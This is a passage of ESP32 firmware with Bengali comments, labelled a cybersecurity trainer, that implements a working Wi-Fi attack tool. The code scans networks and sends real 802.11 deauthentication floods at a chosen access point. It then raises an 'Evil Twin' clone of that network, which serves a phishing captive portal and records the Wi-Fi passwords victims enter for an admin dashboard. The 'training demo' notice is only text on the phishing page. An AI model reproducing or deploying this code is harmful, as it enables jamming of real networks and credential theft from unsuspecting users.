            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="wifi-icon">🔐</div>
        <h2>Wi-Fi Authentication Required</h2>
        <p>Please enter password to connect to</p>
        
        <div class="network-name" id="networkName">Loading...</div>
        
        <form id="loginForm">
            <input type="text" placeholder="Username (Optional)" id="username">
            <input type="password" placeholder="Wi-Fi Password" id="password" required>
            <button type="submit">Connect to Wi-Fi</button>
        </form>
        
        <div class="security-note">
            <strong>⚠️ CYBERSECURITY TRAINING DEMO</strong><br><br>
            This is an educational demonstration only.<br>
            In real life, never enter credentials on unfamiliar Wi-Fi networks.
        </div>
    </div>
    
    <script>
        // Get current network name
        fetch('/getNetwork')
            .then(r => r.json())
            .then(data => {
                document.getElementById('networkName').textContent = data.ssid;
            });
        
        document.getElementById('loginForm').onsubmit = async function(e) {
            e.preventDefault();
            
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            let ssid = document.getElementById('networkName').textContent;
            
            let formData = new FormData();
            formData.append('ssid', ssid);
            formData.append('username', username);
            formData.append('password', password);
            
            await fetch('/login', {
                method: 'POST',
                body: formData
            });
            
            // Show success message
            document.body.innerHTML = `
                <div class="login-box">
                    <div class="wifi-icon" style="color:#28a745;">✅</div>
                    <h2>Connection Successful!</h2>
                    <p>You are now connected to the Wi-Fi network.</p>
                    
                    <div class="security-note" style="background:#d4edda;border-color:#28a745;color:#155724;">
                        <strong>🎓 TRAINING COMPLETE!</strong><br><br>
                        You have successfully completed the Wi-Fi security training.<br>
                        Remember: Always verify Wi-Fi networks before connecting.
                    </div>
                    
                    <button onclick="location.href='http://192.168.4.1'" style="margin-top:20px;">
                        Go to Trainer Dashboard
                    </button>
                </div>
            `;
        };
    </script>
</body>
</html>
)rawliteral";

// ========== ফাংশন ডেফিনিশন ==========

// নেটওয়ার্ক স্ক্যান
void scanNetworks() {
    Serial.println("\n[SCAN] Starting Wi-Fi scan...");
    
    // AP mode চালু রেখেই স্ক্যান করুন
    WiFi.mode(WIFI_AP_STA);
    delay(50);
    
    // দ্রুত স্ক্যান - শুধু active scan, 200ms timeout
    int n = WiFi.scanNetworks(false, false, false, 200);
    networkCount = min(n, 50);
    
    Serial.printf("[SCAN] Found %d networks in fast mode\n", networkCount);
    
    for(int i = 0; i < networkCount; i++) {
        networkSSIDs[i] = WiFi.SSID(i);
        networkBSSIDs[i] = WiFi.BSSIDstr(i);
        networkChannels[i] = WiFi.channel(i);
        networkRSSI[i] = WiFi.RSSI(i);
        
        Serial.printf("  %2d. %-32s (%s) Ch:%2d RSSI:%3d\n",
                     i+1,
                     networkSSIDs[i].c_str(),
                     networkBSSIDs[i].c_str(),
                     networkChannels[i],
                     networkRSSI[i]);
    }
    
    // স্ক্যান ডেটা পরিষ্কার করুন
    WiFi.scanDelete();
}

// Evil Twin AP তৈরি
void createEvilTwinAP(String ssid, String password, int channel) {
    Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
    
    // AP reconfigure করুন (বন্ধ না করে)
    // এতে existing connections maintain হবে
    delay(100);
    
    // Evil Twin AP তৈরি করুন (target SSID দিয়ে)
    bool success = WiFi.softAP(ssid.c_str(), password.c_str(), channel, 0, 8);
    
    if(success) {
        isEvilTwinActive = true;
        evilTwinSSID = ssid;
        evilTwinPASS = password;
        
        Serial.println("[EVIL TWIN] ✅ Created successfully!");
        Serial.printf("  SSID: %s\n", ssid.c_str());
        Serial.printf("  Password: %s\n", password.c_str());
        Serial.printf("  Channel: %d\n", channel);
        Serial.printf("  IP Address: %s\n", WiFi.softAPIP().toString().c_str());
        Serial.println("\n  📱 For Victims: http://192.168.4.1");
        Serial.println("  🔐 For Admin: http://192.168.4.1/admin");
        
        // Evil Twin সার্ভার সেটআপ (Captive Portal)
        phishingServer.on("/", HTTP_GET, []() {
            // Check if accessing admin panel
            String host = phishingServer.header("Host");
            if(host.indexOf("admin") >= 0 || phishingServer.hasArg("admin")) {
                phishingServer.send(200, "text/html", adminDashboard);
            } else {
                phishingServer.send(200, "text/html", phishingPage);
            }
        });
        
        // Captive portal detection (for Android/iOS)
        phishingServer.on("/generate_204", HTTP_GET, []() {
            phishingServer.send(200, "text/html", phishingPage);
        });
        
        phishingServer.on("/hotspot-detect.html", HTTP_GET, []() {
            phishingServer.send(200, "text/html", phishingPage);
        });
        
        phishingServer.on("/getNetwork", HTTP_GET, []() {
            String json = "{\"ssid\":\"" + evilTwinSSID + "\"}";
            phishingServer.send(200, "application/json", json);
        });
        
        phishingServer.on("/login", HTTP_POST, []() {
            String ssid = evilTwinSSID;
            String username = phishingServer.arg("username");
            String password = phishingServer.arg("password");
            String clientIP = phishingServer.client().remoteIP().toString();
            
            // ক্রেডেনশিয়াল সেভ করুন
            if(credCount < 100) {
                capturedCreds[credCount].timestamp = getTimestamp();
                capturedCreds[credCount].ssid = ssid;
                capturedCreds[credCount].username = username;
                capturedCreds[credCount].password = password;
                capturedCreds[credCount].clientIP = clientIP;
                credCount++;
                
                Serial.println("\n[CREDENTIAL] 📧 Captured credential!");
                Serial.printf("  Time: %s\n", capturedCreds[credCount-1].timestamp.c_str());
                Serial.printf("  SSID: %s\n", ssid.c_str());
                Serial.printf("  Username: %s\n", username.c_str());
                Serial.printf("  Password: %s\n", password.c_str());
                Serial.printf("  Client IP: %s\n", clientIP.c_str());
            }
            
            phishingServer.send(200, "text/html", "OK");
        });
        
        phishingServer.begin();
        Serial.println("[EVIL TWIN] Server started on port 8080");
    } else {
        Serial.println("[EVIL TWIN] ❌ Failed to create AP");
    }
}

// Real Deauth Attack Function
void sendDeauthPacket() {
    if(!isDeauthActive || targetBSSID.length() < 17) return;
    
    // Parse BSSID string to bytes
    uint8_t bssid[6];
    if(sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6) {
        Serial.println("[DEAUTH] ❌ Invalid BSSID format!");
        return;
    }
    
    // Set BSSID in deauth packet (source and BSSID fields)
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    // Send deauth packet using AP interface
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    
    if(result == ESP_OK) {
        deauthPacketsSent++;
        
        if(deauthPacketsSent % 100 == 0) {
            Serial.printf("[DEAUTH] 💥 Sent %d packets to %s [%s]\n", 
                         deauthPacketsSent, targetSSID.c_str(), targetBSSID.c_str());
        }
    } else if(deauthPacketsSent == 0) {
        Serial.printf("[DEAUTH] ⚠️ First packet failed: %d\n", result);
    }
}

// Deauth Attack Loop
void simulateDeauthAttack() {
    if(isDeauthActive) {
        // Send multiple packets for better effectiveness
        for(int i = 0; i < 5; i++) {
            sendDeauthPacket();
            delay(1);
        }
    }
}

// ========== Admin সার্ভার রাউটস ==========

void setupAdminServer() {
    // মূল ড্যাশবোর্ড
    adminServer.on("/", HTTP_GET, []() {
        // যদি Evil Twin active থাকে, তাহলে admin check করুন
        if(isEvilTwinActive) {
            String userAgent = adminServer.header("User-Agent");
            // Admin panel শুধু specific user-agent/query parameter দিয়ে access
            if(adminServer.hasArg("admin") || adminServer.uri() == "/admin") {
                adminServer.send(200, "text/html", adminDashboard);
            } else {
                // Victim দেখাবে phishing page
                adminServer.send(200, "text/html", phishingPage);
            }
        } else {
            adminServer.send(200, "text/html", adminDashboard);
        }
    });
    
    // Admin panel dedicated route
    adminServer.on("/admin", HTTP_GET, []() {
        adminServer.send(200, "text/html", adminDashboard);
    });
    
    // নেটওয়ার্ক স্ক্যান এন্ডপয়েন্ট
    adminServer.on("/scan", HTTP_GET, []() {
        scanNetworks();
        
        DynamicJsonDocument doc(4096);
        JsonArray networks = doc.createNestedArray("networks");
        
        for(int i = 0; i < networkCount; i++) {
            JsonObject network = networks.createNestedObject();
            network["ssid"] = networkSSIDs[i];
            network["bssid"] = networkBSSIDs[i];
            network["channel"] = networkChannels[i];
            network["rssi"] = networkRSSI[i];
        }
        
        String json;
        serializeJson(doc, json);
        adminServer.send(200, "application/json", json);
    });
    
    // Deauth শুরু
    adminServer.on("/startDeauth", HTTP_GET, []() {
        targetSSID = adminServer.arg("ssid");
        targetBSSID = adminServer.arg("bssid");
        targetChannel = adminServer.arg("channel").toInt();
        
        // Enable promiscuous mode for packet injection
        esp_wifi_set_promiscuous(true);
        
        // Change AP channel to target channel
        wifi_config_t conf;
        esp_wifi_get_config(WIFI_IF_AP, &conf);
        conf.ap.channel = targetChannel;
        esp_wifi_set_config(WIFI_IF_AP, &conf);
        
        delay(100);
        
        isDeauthActive = true;
        deauthStartTime = millis();
        deauthPacketsSent = 0;
        
        String response = "{\"success\":true,\"message\":\"Deauth started\"}";
        adminServer.send(200, "application/json", response);
        
        Serial.printf("\n[DEAUTH] 💥 Attack started!\n");
        Serial.printf("  Target: %s\n", targetSSID.c_str());
        Serial.printf("  BSSID: %s\n", targetBSSID.c_str());
        Serial.printf("  Channel: %d\n", targetChannel);
        Serial.println("  Mode: Real 802.11 deauth packets");
    });
    
    // Deauth বন্ধ
    adminServer.on("/stopDeauth", HTTP_GET, []() {
        isDeauthActive = false;
        esp_wifi_set_promiscuous(false);
        
        // Restore original AP channel if needed
        wifi_config_t conf;
        esp_wifi_get_config(WIFI_IF_AP, &conf);
        conf.ap.channel = 1; // Default channel
        esp_wifi_set_config(WIFI_IF_AP, &conf);
        
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.printf("\n[DEAUTH] ✅ Attack stopped. Total packets sent: %d\n", deauthPacketsSent);
    });
    
    // Evil Twin তৈরি
    adminServer.on("/createEvilTwin", HTTP_GET, []() {
        String ssid = adminServer.arg("ssid");
        String password = adminServer.arg("password");
        int channel = adminServer.arg("channel").toInt();
        
        createEvilTwinAP(ssid, password, channel);
        
        String response = "{\"success\":true,\"message\":\"Evil Twin created\"}";
        adminServer.send(200, "application/json", response);
    });
    
    // Evil Twin বন্ধ
    adminServer.on("/stopEvilTwin", HTTP_GET, []() {
        // Evil Twin বন্ধ করে Admin AP restore করুন
        WiFi.softAPdisconnect(false);
        delay(100);
        isEvilTwinActive = false;
        
        // Admin AP আবার চালু করুন
        WiFi.softAP(adminSSID, adminPASS);
        
        // Phishing server বন্ধ করুন
        phishingServer.stop();
        
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.println("\n[EVIL TWIN] Stopped, Admin AP restored");
    });
    
    // সব বন্ধ
    adminServer.on("/stopAll", HTTP_GET, []() {
        // Deauth বন্ধ করুন
        if(isDeauthActive) {
            isDeauthActive = false;
            esp_wifi_set_promiscuous(false);
            Serial.println("[SYSTEM] Deauth stopped");
        }
        
        // Evil Twin বন্ধ করুন
        if(isEvilTwinActive) {
            phishingServer.stop();
            WiFi.softAP(adminSSID, adminPASS);
            isEvilTwinActive = false;
            Serial.println("[SYSTEM] Evil Twin stopped");
        }
        
        // Reset counters
        deauthPacketsSent = 0;
        
        adminServer.send(200, "application/json", "{\"success\":true}");
        Serial.println("\n[SYSTEM] ✅ All attacks stopped successfully");
    });
    
    // স্ট্যাটিস্টিক্স
    adminServer.on("/getStats", HTTP_GET, []() {
        StaticJsonDocument<256> doc;
        doc["deauthActive"] = isDeauthActive;
        doc["deauthPackets"] = deauthPacketsSent;
        doc["credentials"] = credCount;
        doc["evilTwinActive"] = isEvilTwinActive;
        doc["uptime"] = millis() / 1000;
        doc["freeHeap"] = ESP.getFreeHeap();
        
        String json;
        serializeJson(doc, json);
        adminServer.send(200, "application/json", json);
    });
    
    // ক্রেডেনশিয়াল লিস্ট
    adminServer.on("/getCredentials", HTTP_GET, []() {
        DynamicJsonDocument doc(2048);
        JsonArray creds = doc.to<JsonArray>();
        
        for(int i = 0; i < credCount; i++) {
            JsonObject cred = creds.createNestedObject();
            cred["timestamp"] = capturedCreds[i].timestamp;
            cred["ssid"] = capturedCreds[i].ssid;
            cred["username"] = capturedCreds[i].username;
            cred["password"] = capturedCreds[i].password;
            cred["clientIP"] = capturedCreds[i].clientIP;
        }
        
        String json;
        serializeJson(doc, json);
        adminServer.send(200, "application/json", json);
    });
    
    // সার্ভার শুরু করুন
    adminServer.begin();
}

// ========== SETUP ফাংশন ==========

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n╔══════════════════════════════════════════╗");
    Serial.println("║    ESP32 CYBER SECURITY TRAINER          ║");
    Serial.println("║    PlatformIO Version 3.0                ║");
    Serial.println("╚══════════════════════════════════════════╝");
    
    // WiFi কনফিগারেশন
    WiFi.mode(WIFI_AP);
    
    // Disable WiFi power save for better performance
    esp_wifi_set_ps(WIFI_PS_NONE);
    
    // Admin AP তৈরি করুন
    WiFi.softAP(adminSSID, adminPASS);
    
    Serial.println("\n✅ ADMIN ACCESS POINT CREATED");
    Serial.printf("   SSID: %s\n", adminSSID);
    Serial.printf("   Password: %s\n", adminPASS);
    Serial.printf("   IP Address: %s\n", WiFi.softAPIP().toString().c_str());
    
    // Admin সার্ভার সেটআপ
    setupAdminServer();
    
    Serial.println("\n🌐 WEB SERVERS STARTED");
    Serial.println("   Admin Dashboard: http://" + WiFi.softAPIP().toString());
    Serial.println("   Evil Twin Portal: http://" + WiFi.softAPIP().toString() + ":8080");
    
    // প্রাথমিক নেটওয়ার্ক স্ক্যান
    scanNetworks();
    
    Serial.println("\n🚀 SYSTEM READY FOR TRAINING");
    Serial.println("   Connect to WiFi: " + String(adminSSID));
    Serial.println("   Password: " + String(adminPASS));
    Serial.println("   Open browser: http://192.168.4.1");
    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║    TRAINING SYSTEM ACTIVE               ║");
    Serial.println("╚══════════════════════════════════════════╝\n");
}

// ========== LOOP ফাংশন ==========

void loop() {
    // Admin সার্ভার হ্যান্ডেল
    adminServer.handleClient();
    
    // Evil Twin সার্ভার হ্যান্ডেল (যদি সক্রিয় থাকে)
    if(isEvilTwinActive) {
        phishingServer.handleClient();
    }
    
    // Deauth অ্যাটাক (প্রতি 5ms এ 5টি packet = 1000 packets/sec)
    static unsigned long lastDeauth = 0;
    if(isDeauthActive && millis() - lastDeauth > 5) {
        simulateDeauthAttack();
        lastDeauth = millis();
    }
    
    // প্রতি 30 সেকেন্ডে নেটওয়ার্ক স্ক্যান (যখন Deauth অ্যাক্টিভ নয়)
    static unsigned long lastScan = 0;
    if(!isDeauthActive && !isEvilTwinActive && millis() - lastScan > 30000) {
        scanNetworks();
        lastScan = millis();
    }
    
    // Memory warning check (প্রতি 10 সেকেন্ডে)
    static unsigned long lastMemCheck = 0;
    if(millis() - lastMemCheck > 10000) {
        uint32_t freeHeap = ESP.getFreeHeap();
        if(freeHeap < 30000) {  // Less than 30KB
            Serial.printf("[WARNING] ⚠️ Low memory: %d bytes free\n", freeHeap);
        }
        lastMemCheck = millis();
    }
    
    // Small delay to prevent watchdog issues
    delay(1);
}